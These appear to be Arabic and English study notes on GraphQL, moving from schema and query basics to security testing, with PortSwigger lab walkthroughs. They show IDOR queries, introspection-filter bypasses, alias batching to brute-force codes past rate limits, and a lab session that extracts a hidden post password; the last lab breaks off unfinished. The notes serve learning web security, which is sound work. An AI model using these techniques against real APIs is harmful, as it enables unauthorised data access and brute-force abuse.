# GraphQL 

<details>
  <summary>what is GraphQL?</summary>


- <details>
      <summary>what is GraphQL & How it work?</summary>

  ## 🧠 ما هو GraphQL؟
  
  **GraphQL** هو لغة استعلام API (بديلة عن REST) تسمح للعملاء بطلب البيانات التي يحتاجونها فقط، مما:
  - يقلل من حجم الاستجابات.
  - يمنع تعدد الطلبات للحصول على بيانات من أكثر من مصدر.
  
  ---
  
  ## ⚙️ كيف يعمل GraphQL؟
  
  - يعتمد على **Schema** يحدد أنواع البيانات والعلاقات بينها.
  - يستخدم **نقطة نهاية واحدة فقط** (عادة POST).
  - جميع العمليات (queries/mutations/subscriptions) تُرسل إلى نفس الـ endpoint.
  
  ---
  
  ## 🔧 أنواع العمليات في GraphQL:
  
  | النوع         | الوظيفة                                       |
  |---------------|-----------------------------------------------|
  | **Query**     | لجلب البيانات                                  |
  | **Mutation**  | لإضافة أو تعديل أو حذف البيانات                |
  | **Subscription** | لإنشاء اتصال دائم لتحديث البيانات تلقائيًا  |
  
  ---
  
  ## 🟢 مميزات GraphQL:
  
  - عميل التطبيق يحدد **ما هي البيانات المطلوبة بالضبط**.
  - لا حاجة لمعرفة مكان البيانات أو كيفية تجميعها.
  - متوافق مع مختلف لغات البرمجة وقواعد البيانات.
  - الاستجابة تأتي بشكل **JSON منظم حسب الطلب**.
  
  ---
  
  ## 🔁 الفرق عن REST:
  
  | REST                      | GraphQL                                   |
  |---------------------------|--------------------------------------------|
  | عدة endpoints             | endpoint واحد فقط                         |
  | HTTP methods (GET, POST…) | POST فقط غالبًا                           |
  | استجابة كاملة              | استجابة مخصصة حسب الطلب فقط              |
  
  


  </details>









- <details>
      <summary>What is a GraphQL schema?</summary>
  
  
  
  ## 📘 ما هو GraphQL Schema؟
  
  **GraphQL Schema** هو العقد (Contract) بين الـ **Frontend** والـ **Backend** يوضح:
  - ما هي البيانات المتاحة.
  - ما هي أنواعها.
  - كيف يمكن استدعاؤها.
  
  ✅ يُكتب باستخدام **لغة تعريف بسيطة ومقروءة (SDL)**.
  
  ---
  
  ## 🧱 ما الذي يحتويه الـ Schema؟
  
  - **أنواع البيانات (Types)**: مثل `Product`, `User`, `Order`...
  - **الحقول (Fields)**: تمثل خصائص الكائنات (مثل name، id...).
  - **الأنواع الأساسية**: مثل `String`, `Int`, `Boolean`, `ID`
  - يمكن أن تكون الحقول:
    - **Object Type** (نوع مركب)
    - **Scalar Type** (نوع بسيط)
    - **Enum / Union / Interface / Custom Types**
  
  🔒 `!` يعني أن الحقل **إجباري (Non-nullable)**
  
  ---
  
  ## ✏️ مثال على تعريف Schema بسيط:
  
  ```graphql
  type Product {
    id: ID!
    name: String!
    description: String!
    price: Int
  }
  ```
  
  #### 📌 هذا يعرف نوع اسمه Product يحتوي على:
  
  - ``id``: معرف فريد (إجباري)
  
  - ``name``: اسم المنتج (إجباري)
  
  - ``description``: وصف (إجباري)
  
  - ``price``: السعر (اختياري)
  
  
  ## 🔍 مكونات إضافية في الـ Schema:
  
  يجب أن يحتوي على Query واحدة على الأقل (لجلب البيانات)
  
  عادةً يحتوي أيضًا على Mutations (لإضافة/تعديل/حذف بيانات)
  
  
  ## 💡 ملخص سريع:
  
  | العنصر           | الوصف                                   |
  | ---------------- | --------------------------------------- |
  | Schema           | يحدد شكل البيانات وكيف يتم الوصول إليها |
  | Types            | الكائنات التي يمكن استرجاعها أو تعديلها |
  | Fields           | خصائص كل كائن (الاسم، السعر، إلخ)       |
  | Non-nullable (!) | حقل إجباري لا يمكن أن يكون فارغًا       |
  
  



  </details>








- <details>
     <summary>What are GraphQL queries?</summary>
  
  
  ## 🔍 ما هي GraphQL Queries؟
  
  **GraphQL Queries** تُستخدم لاسترجاع البيانات من قاعدة البيانات أو مصدر البيانات.
  
  ✅ تشبه طلبات **GET** في REST APIs، لكنها:
  - أكثر مرونة
  - تُعيد فقط البيانات التي تطلبها
  
  ---
  
  ## 🧱 مكونات الاستعلام (Query):
  
  | العنصر                 | الوصف                                               |
  |-------------------------|------------------------------------------------------|
  | **نوع العملية (query)** | لتوضيح أن الطلب هو استعلام (اختياري لكن مفضل)       |
  | **اسم الاستعلام**       | لتسهيل التتبع والتصحيح (اختياري لكنه مفضل)          |
  | **الهيكلية المطلوبة**   | تحدد الحقول التي تريد استرجاعها                     |
  | **المعاملات (arguments)** | لتحديد عناصر معينة بناءً على شرط (مثل ID)            |
  
  ---
  
  ## ✏️ مثال على Query:
  
  ```graphql
  query myGetProductQuery {
    getProduct(id: 123) {
      name
      description
    }
  }
  ```
  
  
  ### 📌 هذا الاستعلام يطلب من الخادم:
  
  المنتج الذي معرفه ``123``
  
  ويطلب فقط الاسم والوصف
  
   > 💡 ملاحظة: حتى لو كان نوع Product يحتوي على حقول أكثر، فأنت تتحكم في ما يتم استرجاعه فقط.
  
  
  
  
  ## 📚 ملخص سريع:
  
  
  
  | المفهوم      | القيمة                                          |
  | ------------ | ----------------------------------------------- |
  | الاستعلام    | طلب بيانات من الخادم                            |
  | يشبه في REST | طلب `GET`                                       |
  | المرونة      | تطلب الحقول التي تحتاجها فقط                    |
  | المعاملات    | تُستخدم لتحديد بيانات معينة مثل `id`, `name`... |
  
  


  </details>







- <details>
     <summary>What are GraphQL mutations?</summary>
  
  
  ## 🔧 ما هي GraphQL Mutations؟
  
  **Mutations** تُستخدم لتعديل البيانات، وتشمل:
  - الإضافة (Create)
  - التعديل (Update)
  - الحذف (Delete)
  
  🟩 تقابل في REST:
  - `POST` / `PUT` / `DELETE`
  
  ---
  
  ## 🧱 مكونات الـ Mutation:
  
  | العنصر                   | الوصف                                                         |
  |---------------------------|----------------------------------------------------------------|
  | **نوع العملية (mutation)**| يُحدد أن العملية هي تعديل بيانات                              |
  | **اسم العملية**           | (اختياري لكنه مفيد) لتسهيل التتبع                             |
  | **المدخلات (Inputs)**     | يجب تمرير بيانات (قيم) لإجراء التعديل                         |
  | **الاستجابة**             | تحدد الحقول التي تريد إرجاعها بعد التعديل                     |
  
  ---
  
  ## ✏️ مثال على Mutation:
  
  ```graphql
  mutation {
    createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
      id
      name
      listed
    }
  }
  ```
  
  
  ### 📌 هذا يقوم بـ:
  
  - إنشاء منتج جديد
  
  - يطلب من الخادم إرجاع id, name, و listed في الاستجابة
  
  
  
  
  ---
  
  ## 📥 مثال على الاستجابة:
  
  ```json
  {
    "data": {
      "createProduct": {
        "id": 123,
        "name": "Flamin' Cocktail Glasses",
        "listed": "yes"
      }
    }
  }
  ```
  
  
  
  ## 📚 ملخص سريع:
  
  | المفهوم      | القيمة                                       |
  | ------------ | -------------------------------------------- |
  | الغرض        | تعديل البيانات (إضافة، تعديل، حذف)           |
  | يشبه في REST | POST / PUT / DELETE                          |
  | يجب أن يحتوي | مدخلات (inputs)                              |
  | الاستجابة    | تحدد الحقول المراد إرجاعها بعد تنفيذ العملية |
  
  
  
  
  
  

     
  </details>













- <details>
     <summary>Components of queries and mutations</summary>

  
  
  # 📌 Components of GraphQL Queries and Mutations
  
  GraphQL يتكوّن من عناصر أساسية تُستخدم لجلب البيانات (queries) أو تعديلها (mutations).
  
  ---
  
  ## 🔸 Fields (الحقول)
  
  - كل نوع (Type) يحتوي على **Fields** يمكن استدعاؤها.
  - يمكنك تحديد فقط الحقول المطلوبة في الطلب.
  - الاستجابة تعكس ما طلبته بالضبط.
  
  ### ✅ مثال:
  
  ```graphql
  query myGetEmployeeQuery {
    getEmployees {
      id
      name {
        firstname
        lastname
      }
    }
  }
  ```

  ## Response

  ```json
      #Response
  
      {
          "data": {
              "getEmployees": [
                  {
                      "id": 1,
                      "name" {
                          "firstname": "Carlos",
                          "lastname": "Montoya"
                      }
                  },
                  {
                      "id": 2,
                      "name" {
                          "firstname": "Peter",
                          "lastname": "Wiener"
                      }
                  }
              ]
          }
      }
  ```

  ---
  
  ## 🔸 Arguments (المعاملات)
  
  - تُستخدم لتمرير قيم إلى الاستعلام.
  - تُحدَّد في الـ Schema.
  - تُساعد على جلب بيانات محددة.
  
  ### ✅ مثال:
  
  ```graphql
  query myGetEmployeeQuery {
    getEmployees(id: 1) {
      name {
        firstname
        lastname
      }
    }
  }
  ```

  ## response
  
  ```json
   #Response to query
  
      {
          "data": {
              "getEmployees": [
              {
                  "name" {
                      "firstname": Carlos,
                      "lastname": Montoya
                      }
                  }
              ]
          }
      }
  ```






  
  📌 **تنبيه:** يمكن أن تكون عرضة لهجمات مثل **IDOR** إذا لم يتم تأمين الوصول جيدًا.
  
  ---
  
  ## 🔸 Variables (المتغيرات)
  
  - تُستخدم لتمرير قيم ديناميكية بدلاً من وضعها مباشرة في الاستعلام.
  - تفصل بين **هيكل الاستعلام** و**قيم البيانات**.
  
  ### ✅ مثال:
  
  ```graphql
 
    #Example query with variable

    query getEmployeeWithVariable($id: ID!) {
        getEmployees(id:$id) {
            name {
                firstname
                lastname
            }
         }
    }

    Variables:
    {
        "id": 1
    }
  ```
  
 
  
  ---
  
  ## 🔸 Aliases (الأسماء البديلة)
  
  - تسمح بطلب نفس النوع أكثر من مرة في نفس الاستعلام.
  - تتجاوز القيود بأن يكون لكل خاصية اسم فريد.
  
  ### ❌ استعلام غير صحيح:
  
  ```graphql
 
    #Invalid query

    query getProductDetails {
        getProduct(id: 1) {
            id
            name
        }
        getProduct(id: 2) {
            id
            name
        }
    }
  ```
  
  ### ✅ استعلام صحيح باستخدام Aliases:
  
  ```graphql
  query getProductDetails {
    product1: getProduct(id: "1") {
      id
      name
    }
    product2: getProduct(id: "2") {
      id
      name
    }
  }
  ```

  ## response

  ```json

    #Response to query

    {
        "data": {
            "product1": {
                "id": 1,
                "name": "Juice Extractor"
             },
            "product2": {
                "id": 2,
                "name": "Fruit Overlays"
            }
        }
    }
  ```
  
  ---
  
  ## 🔸 Fragments (الأجزاء القابلة لإعادة الاستخدام)
  
  - تُستخدم لتعريف مجموعة من الحقول مرة واحدة.
  - تُساعد في تقليل التكرار وإعادة استخدام نفس البنية في عدة أماكن.
  
  ### ✅ مثال:
  
  ```graphql
  fragment productInfo on Product {
    id
    name
    listed
  }
  
 
  ```

  ## query calling fragment
  
  ```graphql
   #Query calling the fragment
  
      query {
          getProduct(id: 1) {
              ...productInfo
              stock
          }
      }
  ```
  
  ## response 
  
  ```json
     #Response including fragment fields
  
      {
          "data": {
              "getProduct": {
                  "id": 1,
                  "name": "Juice Extractor",
                  "listed": "no",
                  "stock": 5
              }
          }
      }
  ```


 
  ---
  
  ## 📚 ملخص سريع:
  
  | المكون       | الوظيفة الرئيسية                                                              |
  |--------------|--------------------------------------------------------------------------------|
  | Fields        | تحديد ما يجب استرجاعه من بيانات                                                |
  | Arguments     | تمرير قيم لتحديد أو تخصيص البيانات المطلوبة                                    |
  | Variables     | فصل القيم عن الاستعلام لسهولة التكرار والتعديل                                 |
  | Aliases       | إرسال نفس الطلب لنوع معين أكثر من مرة باستخدام أسماء بديلة                    |
  | Fragments     | تعريف أجزاء قابلة لإعادة الاستخدام في استعلامات أو Mutations متعددة           |
  
  





  </details>




- <details>
     <summary>Subscriptions & Introspection</summary>


  # 🔄 GraphQL Subscriptions & Introspection
  
  ## 🔸 Subscriptions
  
  **Subscriptions** هي نوع خاص من الاستعلامات (queries)، لكن الفرق الرئيسي هو أنها:
  - تُنشئ **اتصال دائم** بين العميل (Client) والخادم (Server)
  - تُستخدم لتلقي **تحديثات لحظية (Real-time)** من السيرفر دون الحاجة للاستعلام بشكل مستمر
  
  ### ✅ الفائدة الأساسية:
  - مناسبة للتحديثات السريعة والصغيرة مثل:
    - تطبيقات الدردشة (Chat apps)
    - تحرير المحتوى التعاوني (مثل Google Docs)
    - الإشعارات المباشرة
  
  ### ⚙️ طريقة العمل:
  - غالبًا يتم تنفيذها باستخدام **WebSockets**
  - تُحدد شكل البيانات المطلوبة مثل الاستعلامات العادية
  
  ---
  
  ## 🔍 Introspection
  
  **Introspection** هي ميزة مدمجة في GraphQL تسمح لك بـ:
  - الاستعلام عن معلومات حول **الـ Schema** نفسها
  - معرفة أنواع البيانات، الحقول، الاستعلامات المتاحة، الـ mutations، وغيرها
  
  ### ✅ تُستخدم في:
  - أدوات مثل **GraphQL Playground** أو **GraphiQL**
  - توليد التوثيق (Documentation)
  
  ### ⚠️ مخاطر أمنية:
  - يمكن أن تكشف **معلومات حساسة** عن الـ API
  - يمكن أن تساعد المخترق في معرفة كيفية التفاعل مع الـ API
  - 🔒 **يُنصح بإيقافها في بيئات الإنتاج (Production)**
  
  ---
  
  ## 📚 ملخص سريع:
  
  | العنصر         | الوصف                                                                 |
  |----------------|------------------------------------------------------------------------|
  | Subscriptions  | اتصال دائم من السيرفر للعميل لتحديث البيانات لحظيًا                     |
  | Introspection  | استعلام عن هيكل الـ GraphQL نفسه (Schema)                              |
  | تستخدم في      | الدردشة، التحديثات اللحظية، توثيق GraphQL                               |
  | المخاطر        | Introspection قد تكشف تفاصيل داخلية حساسة - يجب تعطيلها في الإنتاج     |
  """
  

  </details>





  
</details>





<details>
  <summary>Finding GraphQL endpoints</summary>



# 🔍 Discovering & Testing GraphQL Endpoints

قبل اختبار أي GraphQL API، لازم تلاقي أولًا **الـ endpoint** الخاص بيها. كل طلبات GraphQL تروح لنفس الـ endpoint، فمعرفته مهمة جدًا.

---

## 🧪 Universal Query

### ما هو؟
استعلام بسيط لاختبار إذا كان عنوان URL يحتوي على GraphQL endpoint.

### ✅ مثال:
```graphql
query { __typename }
```

### 📥 الاستجابة المتوقعة:
```json
{
  "data": {
    "__typename": "query"
  }
}
```

🔎 هذا يساعدك تتأكد إنك بتتعامل مع GraphQL.

---

## 📍 Common GraphQL Endpoints

جرب ترسل universal query لهذه المسارات:

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`
- (أحيانًا) أضف `/v1` في النهاية مثل: `/api/graphql/v1`

---

## 📬 طرق إرسال الطلبات (Request Methods)

| الطريقة       | الحالة                                      |
|---------------|----------------------------------------------|
| `POST` + `application/json` | ✅ الأفضل والأكثر أمانًا                  |
| `GET` أو `POST` + `x-www-form-urlencoded` | 🚫 ممكن تكون متاحة في بعض التطبيقات |

🔒 من الأفضل أن تقبل فقط POST + JSON لتفادي **CSRF**.

---

## 🧭 كيفية التأكد من الـ Endpoint

- جرب كل المسارات المعروفة باستخدام universal query.
- لو رجع استجابة بـ "query not present" أو شبيه، ده غالبًا GraphQL.
- غير طرق الطلب وشوف الاستجابة.

---

## 🧰 أدوات مساعدة

- **Burp Scanner**: بيقدر يكتشف GraphQL endpoints تلقائيًا.
  - يظهر إشعار "GraphQL endpoint found" لو تم اكتشافه.

- **Burp Proxy**:
  - استخدم المتصفح المدمج في Burp.
  - راقب HTTP History وشوف الطلبات اللي بيتم إرسالها.
  - كده تقدر تشوف استعلامات GraphQL الحقيقية في التطبيق.

---

## 📚 ملخص سريع:

| العنصر               | التوضيح                                                        |
|------------------------|----------------------------------------------------------------|
| Universal Query        | استعلام بسيط للتأكد من وجود GraphQL                          |
| Common Endpoints       | مسارات متكررة غالبًا تستخدمها الخدمات                        |
| طرق HTTP               | جرب POST + JSON أولًا، ثم طرق أخرى لو فشلت                    |
| أدوات الكشف           | Burp Suite مفيد جدًا في تحليل واستكشاف واجهات GraphQL         |


  
</details>










<details>
  <summary>Exploiting unsanitized arguments</summary>


  
  # ⚠️ Exploiting Unsanitized Arguments in GraphQL
  
  في مرحلة اختبار الأمان، من الجيد البدء باختبار **المعاملات (arguments)** داخل الاستعلامات. بعض التطبيقات تكون معرضة لثغرات **الوصول غير المصرح به** أو ما يُعرف بـ **IDOR**.
  
  ---
  
  ## ❗ ما هي ثغرة IDOR في GraphQL؟
  
  - تحدث عندما يُسمح للمستخدم بطلب كائن باستخدام معرف (ID) دون التأكد من صلاحياته.
  - المستخدم قد يصل إلى بيانات لا يملك إذنًا لرؤيتها فقط عن طريق تغيير قيمة الـ ID.
  
  ---
  
  ## 🎯 مثال عملي:
  
  ### 🔹 استعلام يعرض المنتجات المتاحة فقط:
  
  ```graphql
  query {
    products {
      id
      name
      listed
    }
  }
  ```
  
  ### 🔹 استجابة توضح المنتجات المتاحة فقط:
  
  ```json
  {
    "data": {
      "products": [
        { "id": 1, "name": "Product 1", "listed": true },
        { "id": 2, "name": "Product 2", "listed": true },
        { "id": 4, "name": "Product 4", "listed": true }
      ]
    }
  }
  ```
  
  📌 الملاحظة:
  - المنتج ذو ID رقم 3 غير ظاهر. من المحتمل أنه **غير مُدرج** أو محجوب.
  
  ---
  
  ## 🕵️‍♂️ محاولة الوصول للمنتج الغير ظاهر:
  
  ```graphql
  query {
    product(id: 3) {
      id
      name
      listed
    }
  }
  ```
  
  ### 🧨 استجابة غير متوقعة:
  
  ```json
  {
    "data": {
      "product": {
        "id": 3,
        "name": "Product 3",
        "listed": false
      }
    }
  }
  ```
  
  ✅ يعني أنه لا يوجد تحقق من صلاحيات المستخدم، وقدرنا نوصل لمنتج **غير ظاهر للعامة**.
  
  ---
  
  ## 🚨 الملخص:
  
  | العنصر              | التوضيح                                                  |
  |---------------------|-----------------------------------------------------------|
  | نوع الهجوم         | Insecure Direct Object Reference (IDOR)                   |
  | السبب              | عدم وجود تحقق من صلاحيات المستخدم عند استخدام المعاملات   |
  | النتيجة المحتملة   | الوصول إلى بيانات حساسة أو غير معلنة                      |
  | الطريقة            | تغيير قيمة الـ ID أو معلمة في الاستعلام يدويًا            |
  
  ---
  
  ## 🔐 التوصية للمطورين:
  
  - تأكد دائمًا من صلاحيات المستخدم قبل جلب الكائنات الحساسة.
  - لا تعتمد فقط على أن الاستعلام لا يُرجع البيانات في بعض الحالات.
  - راجع التحكم بالوصول (Access Control) بدقة.
  
  
  
    
</details>






<details>
  <summary>Discovering schema information</summary>




# 🧠 Discovering Schema Information in GraphQL

الخطوة التالية بعد الوصول لنقطة النهاية (endpoint) في GraphQL هي **اكتشاف معلومات المخطط (schema)** لفهم كيفية التفاعل مع الـ API.

---

## 🔍 ما هي Introspection؟

- Introspection هي ميزة مدمجة في GraphQL تتيح لك الاستعلام عن معلومات حول المخطط (schema).
- تُستخدم لفهم أنواع البيانات المتاحة، والاستعلامات (queries)، والتحويلات (mutations)، والاشتراكات (subscriptions)، وحتى الأوصاف الخاصة بها.

---

## ✨ فائدة Introspection

| الفائدة                         | التوضيح |
|--------------------------------|---------|
| فهم البنية الكاملة للـ API     | تعرف ما هي الأنواع والاستعلامات والحقول المتوفرة |
| كشف معلومات حساسة محتملة      | مثل الأوصاف أو الأسماء الداخلية التي لم تُنشر للعامة |
| تستخدمها أدوات التوثيق IDEs   | مثل GraphQL Playground و Postman و Burp Scanner |

---

## 🚀 استخدام introspection

### ✅ استعلام بسيط للتأكد من تفعيل introspection:

```json
{
  "query": "{__schema{queryType{name}}}"
}
```

📌 إذا استرجعت أسماء الاستعلامات، فإن introspection مفعلة.

---

## 📜 استعلام Introspection كامل

إذا أردت استخراج كل تفاصيل المخطط:

```graphql

    #Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

🔧 ملاحظة: احذف `onOperation`, `onFragment`, `onField` إن ظهرت لك أخطاء.

---

## 📊 أدوات لتسهيل الفهم

- **GraphQL Visualizer**: يعرض علاقات المخطط بطريقة رسومية.
- **Burp Suite**: يمكنه توليد استعلام introspection واكتشاف التوجيهات والمخطط.
- **Clairvoyance**: أداة تقوم بجمع معلومات المخطط من **الاقتراحات** حتى لو كان introspection معطل.

---

## 💬 ماذا عن الاقتراحات؟

- تستخدم بعض الخوادم مثل Apollo GraphQL ميزة **الاقتراحات الذكية**.
- عند وجود خطأ بسيط في اسم الحقل، يقترح الاسم الصحيح.
- يمكن استغلال هذه الميزة لاستخراج المخطط جزئياً.

🔍 مثال:
> There is no entry for 'productInfo'. Did you mean 'productInformation'?

🛡️ لا يمكن تعطيل الاقتراحات مباشرةً في Apollo، ولكن هناك بعض الحيل في GitHub لتعطيلها.

---

## 📌 ملاحظات أمنية

| الجانب الأمني       | التوصية |
|---------------------|---------|
| introspection       | يجب تعطيله في بيئة الإنتاج |
| الاقتراحات          | تجنب تمكينها أو قم بفحص الردود بدقة |
| Burp Scanner        | يمكنه اختبار introspection والاقتراحات تلقائيًا |





  
</details>







<details>
  <summary>Bypassing GraphQL introspection defenses</summary>


# 🔍 Bypassing GraphQL Introspection Defenses

When developers try to secure GraphQL APIs by disabling **introspection**, they often rely on naive regex filters that block any query containing `__schema`. However, these filters can be bypassed in clever ways.




---

## 🔐 What Developers Do (Wrongly)

To prevent this, developers often filter out requests containing `__schema` or `__introspection`, using regular expressions.

Example:
```regex
/__schema{/
```

This blocks simple introspection queries... **but only the exact format.**

---

## 💥 Bypass Techniques

### 1. Inject Special Characters

GraphQL **ignores whitespaces, new lines, and commas**.

But naive regex filters don’t. So, by inserting harmless characters, you bypass the filter.

#### Example: Using a Newline Character

```json
{
  "query": "query{__schema
{queryType{name}}}"
}
```

#### Why this works:

- The developer's regex blocks `__schema{`
- But `__schema
{` doesn’t match their pattern
- Yet GraphQL still parses it correctly ✅

---

### 2. Try Alternative Request Methods

Developers may only disable introspection on POST requests.

Try:

#### ▶ GET Request with URL-Encoded Introspection Query

```http
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

Decoded:
```graphql
query {
  __schema
  {
    queryType {
      name
    }
  }
}
```

#### ▶ POST Request with Form URL-Encoded Body

```http
POST /graphql
Content-Type: application/x-www-form-urlencoded

query=query{__schema{queryType{name}}}
```

---

## 🧠 Extra Tips

- Save results to your Burp Suite **Site Map** for later analysis
- Combine this with tools like **GraphQL Voyager**, **InQL**, or **GraphQLmap** to visualize the schema
- Once schema is found, try:
  - Sensitive queries (email, password, tokens)
  - Mutations that may allow actions like reset, delete, or admin escalation

---

## 🛠 Want to Automate This?

You can easily script these bypass attempts using **Python + requests** to iterate over multiple bypass formats and content-types.

Let me know if you want the script.

---

## ✅ Goal

Get access to the full GraphQL schema **even if introspection is "disabled".**
This enables a full map of the API surface for further exploitation.

---

Stay sneaky 😎

  
</details>






<details>
  <summary>Bypassing rate limiting using aliases</summary>



# 🚀 Bypassing Rate Limiting using GraphQL Aliases

## 📌 المشكلة الأساسية: Rate Limiting
- الـ **Rate Limiting** هو نظام بيحط قيود على عدد الـ **requests** اللي تقدر تبعتها للـ API خلال فترة زمنية معينة.  
  **مثال:**
  - مسموح لك تبعت **5 requests في الدقيقة**.
  - لو بعت أكتر، السيرفر هيبدأ يرد عليك برسالة زي:  
    ```
    429 Too Many Requests
    ```
- الهدف منه إنه يمنع هجمات **brute force** أو **DoS attacks**.

---

## 📌 GraphQL وموضوع الـ Aliases
- في GraphQL، العادي إنك **ماينفعش تكرر نفس الـ field مرتين** في نفس الـ query.  
  **مثال (❌ غلط):**
  ```graphql
   query {
       isValidDiscount(code: 123)
       isValidDiscount(code: 456)
   }
  ```
  هيطلع لك Error لأنك كررت `isValidDiscount`.

---

## 📌 الحل → Aliases
- **Aliases** في GraphQL بتسمح لك إنك **تدي اسم مختلف لكل field**، حتى لو نفس الـ function أو الـ resolver.  
  **مثال (✅ صح):**
  ```graphql
  query {
      discount1: isValidDiscount(code: 123) {
          valid
      }
      discount2: isValidDiscount(code: 456) {
          valid
      }
      discount3: isValidDiscount(code: 789) {
          valid
      }
  }
  ```

هنا:
- `discount1` → هي alias للـ `isValidDiscount` الأول.
- `discount2` → alias تاني.
- وهكذا...

---

## 📌 إزاي ده بيكسر Rate Limiting؟
- بعض أنظمة الـ **Rate Limiting** بتحسب **عدد الـ requests** بس، مش **عدد العمليات الداخلية في GraphQL**.
- **GraphQL Aliases** بتخليك تبعت **Request واحدة** فيها **عمليات كتير**.

### 📍 **مثال حقيقي:**
بدل ما تبعت 100 طلب بالشكل ده:
```graphql
query {
    isValidDiscount(code: 123)
}
```
تبعت طلب واحد بس كده:
```graphql
query {
    d1: isValidDiscount(code: 123) { valid }
    d2: isValidDiscount(code: 124) { valid }
    d3: isValidDiscount(code: 125) { valid }
    d4: isValidDiscount(code: 126) { valid }
    d5: isValidDiscount(code: 127) { valid }
    ...
    d100: isValidDiscount(code: 222) { valid }
}
```

🔹 **النتيجة:**
- السيرفر شايف إن ده **Request واحد** → وبالتالي مش هيوقفك بالـ rate limiter.  
- إنت فعليًا عملت **brute force** جوه الـ API من غير ما تتقيد بعدد الـ requests.

---

## 📌 سيناريو عملي (تخيل تحدي CTF):
لو عندك endpoint في GraphQL بيتأكد من كود خصم:
```graphql
query {
    isValidDiscount(code: "12345") {
        valid
    }
}
```
بدلاً من تبعت كود واحد في كل Request → تبعت 50 كود في Request واحدة:
```graphql
query {
    check1: isValidDiscount(code: "11111") { valid }
    check2: isValidDiscount(code: "22222") { valid }
    check3: isValidDiscount(code: "33333") { valid }
    check4: isValidDiscount(code: "44444") { valid }
    check5: isValidDiscount(code: "55555") { valid }
}
```

🔹 **كده لو فيه كود صحيح، هتعرفه بسرعة كبيرة من غير ما تتوقف بالـ rate limiting.**

---

## 📌 الخلاصة:
- **Aliases** في GraphQL وسيلة لتسمية نفس العملية بأسماء مختلفة.
- تقدر تستغلها علشان **تعمل brute force في طلب واحد بس**.
- ده بيكسر أنظمة rate limiting الضعيفة لأنها بتحسب عدد الـ requests مش العمليات الداخلية.





  
</details>































































































































----
----


# **``GraphQL Labs``**



<details>
  <summary>Lab: Accessing private GraphQL posts</summary>

> ### The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password. 


---

1. active **``burp live passive Crawl``**

<img width="400" height="168" alt="image" src="https://github.com/user-attachments/assets/1aabdb2e-2be3-419d-8f5e-5cbbf23f341b" />

**``Found``**


```http
POST /graphql/v1 HTTP/2
Host: 0a840000031c9eaf83cdf5c7001700fe.web-security-academy.net
Cookie: session=6rY0h8IeXuTOu3Viib6k5KsJYOZNxku1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a840000031c9eaf83cdf5c7001700fe.web-security-academy.net/post?postId=2
Content-Type: application/json
Content-Length: 249
Origin: https://0a840000031c9eaf83cdf5c7001700fe.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers



{"query":"\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n            author\n            date\n            paragraphs\n        }\n    }","operationName":"getBlogPost","variables":{"id":2}}
```


find introspection

simple one to check

<img width="1524" height="476" alt="image" src="https://github.com/user-attachments/assets/403cf877-4073-4ec6-becb-c926c3b227a0" />


> Don't forget to convert form ``graphql`` to ``json`` 

[From_graphql_2_json](https://datafetcher.com/graphql-json-body-converter)

```json
{

  "query": " query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"

}
```

<img width="1570" height="723" alt="image" src="https://github.com/user-attachments/assets/3104cd2c-b626-4eae-9ff3-f741a7135f57" />


> ### put output to visulizer

[graphql_visulaize3r](http://nathanrandal.com/graphql-visualizer/)


<img width="848" height="657" alt="image" src="https://github.com/user-attachments/assets/40ebcb57-fe05-4ba5-906c-31ec3f82fb39" />


Try to read content of ``postPassword`` of all posts

```graphql
query {
  getAllBlogPosts {
    id
    title
    postPassword
  }
}
```

but if you notice that there ar id form ``1`` to ``5`` exept **``3``** this might be it's ``isPrivate: Boolean!`` is true

<img width="1527" height="622" alt="image" src="https://github.com/user-attachments/assets/6546c0c4-2f1a-4cac-990c-05e145d21c22" />

so if i use the first query and try to see password 

```json
{"query":"\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n            author\n            date\n            paragraphs\n     postPassword\n   }\n    }","operationName":"getBlogPost","variables":{"id":3

}}
```

<img width="1544" height="651" alt="image" src="https://github.com/user-attachments/assets/e689a70d-8315-4412-9c87-b8d5aa85efd6" />


found the password

```

```

  
</details>









<details>
  <summary>Lab: Accidental exposure of private GraphQL fields</summary>


### > The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

> To solve the lab, sign in as the administrator and delete the username ``carlos``. 

---

find this request 

<img width="1211" height="602" alt="image" src="https://github.com/user-attachments/assets/ce5ced22-73f4-416f-835a-effedd00e716" />

``Introspection Query``
